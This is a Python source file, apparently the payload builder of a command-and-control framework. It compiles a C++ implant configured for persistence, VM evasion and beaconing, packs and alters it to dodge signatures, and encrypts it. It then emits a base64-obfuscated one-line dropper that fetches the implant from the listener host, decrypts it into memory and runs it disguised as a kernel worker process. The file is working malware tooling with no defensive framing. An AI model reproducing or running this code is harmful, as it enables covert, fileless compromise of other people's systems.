#!/bin/python3

from random import randint, sample,choice
import base64, json, uuid, re
from models import _Payload
from app import db

import subprocess, shutil
from fs.tempfs import TempFS

def use_base64(text_in):#
	return f"base64.b64decode({base64.standard_b64encode(text_in.encode())}).decode()"


def create_fileless_payload(payload_file, listener_address, payload_key):
	
	payload = '''import os
if os.fork() == 0:
	import subprocess, requests, json
	fd0=os.memfd_create('0')
	fd1=os.memfd_create('1')
	os.write(fd0, str.encode(json.loads(requests.get('http://%s/download/%s').text)[0]))
	os.write(fd1, subprocess.Popen(['openssl', 'enc', '-aes-256-ecb', '-a', '-pbkdf2', '-in', f'/proc/{os.getpid()}/fd/{fd0}', '-d', '-k',  '%s'], stdout=subprocess.PIPE).communicate()[0])
	os.execve(f'/proc/{os.getpid()}/fd/{fd1}', ['[kworker/u:0]'], os.environ.copy())
os._exit(0)''' % (listener_address, payload_file, payload_key)
	
	payload = f"exec('''{payload}''')"
	
	return f''' python3 -c "import base64;exec({use_base64(payload)})" </dev/null &>/dev/null &''' # 

#bash command needs tweaking so command isn't revealed on hitting enter

def edit_source_str(file_lines, line, var_value):
		changed_line = line.split('\"')
		changed_line[1] = var_value
		file_lines[file_lines.index(line)] = '\"'.join(changed_line)

def generate_payload(pl_dict, settings_dict):
	##payload options:
		##text-based: py_fileless, bin_crypted
		##hosted: py_off_script, py_on_script, bin_packed, bin_raw
	#copy client source to temp fs
	tmp_fs = TempFS()
	tmp_path = tmp_fs.getsyspath("/")
	source_path = f'clients/{pl_dict["os"]}/{pl_dict["name"]}/'#change to new hierarchy
	shutil.copytree(f'{source_path}src', f'{tmp_path}src')
	shutil.copytree(f'{source_path}headers', f'{tmp_path}headers')
	#change globals.cpp
	with open(f'{tmp_path}src/globals.cpp', "r") as gf:
		glines = gf.readlines()
	for gline in glines:
		##change uuid
		if "client_id" in gline:
			edit_source_str(glines, gline, str(uuid.uuid4()))
		##change listener info
		elif "listener_json" in gline:
			edit_source_str(glines, gline, f'({settings_dict["listener_json"]})')
		##change project id
		elif "project_id" in gline:
			edit_source_str(glines, gline, settings_dict["project_id"])
		##change exp date
		elif "expiration_date" in gline:
			edit_source_str(glines, gline, settings_dict["expiration_date"])
		##set PERSIST_ON
		elif "PERSIST_ON" in gline:
			glines[glines.index(gline)] = re.sub('(?<=\= )\w*', settings_dict["PERSIST_ON"], gline)
		##set NO_VM
		elif "NO_VM" in gline:
			glines[glines.index(gline)] = re.sub('(?<=\= )\w*', settings_dict["NO_VM"], gline)
		##set sleep_time
		elif "sleep_time" in gline:
			glines[glines.index(gline)] = re.sub('(?<=\= )\w*', settings_dict["sleep_time"], gline)
	##write to file
	with open(f'{tmp_path}src/globals.cpp', "w") as gf:
		gf.write(''.join(glines)+'\n')
	#compile with subprocess
	
	compile_command = ['g++','-s','-Os','-I',f'{tmp_path}headers','-o',f'{tmp_path}client.out',
		f'{tmp_path}src/main.cpp',
		f'{tmp_path}src/globals.cpp',
		f'{tmp_path}src/local.cpp',
		f'{tmp_path}src/net.cpp',
		f'{tmp_path}src/persist.cpp',
		f'{tmp_path}src/evasion.cpp',
		f'{tmp_path}src/task.cpp']
	##pl_arch used here
	if pl_dict['arch'] == 'i386':
		compile_command.insert(1, "-m32")
	subprocess.Popen(compile_command).wait()
		#issue with using * and Popen since it's interpreted literally. might be able to use r'' and %?
	#pack with upx
	subprocess.Popen(
		['upx','-9','-o',f'{tmp_path}client.packed',f'{tmp_path}client.out']).wait()
	#mangle packed file #change one trival byte, remove UPX strings
	fh = open(f'{tmp_path}client.packed', "r+b")
	fh.seek(-1,2)
	fh.write(hex(randint(0x01,0xff)).encode()) #works, but stupidly alters the last byte to the string value
	fh.close()
	#run through crypter
	if pl_dict['type'] == "py_fileless":
		pl_file_name = str(uuid.uuid4())[:8]
		pl_listener_address = json.loads(settings_dict["listener_json"])[0]['host'] + ':' + json.loads(settings_dict["listener_json"])[0]['port']
		key = ''.join(choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(24))
		print(key)
		subprocess.run(['openssl', 'enc', '-aes-256-ecb', '-a', '-pbkdf2', '-in', f'{tmp_path}client.out', '-k', key, '-out', f'payloads/{pl_file_name}'])
		#use payload model here
		finished_payload = create_fileless_payload(pl_file_name, pl_listener_address, key)
	elif pl_dict['type'] == "bin_crypted":
		pass
	elif pl_dict['type'] == "bin_packed":
		pass
	#cleanup
	tmp_fs.close()
	
	return finished_payload

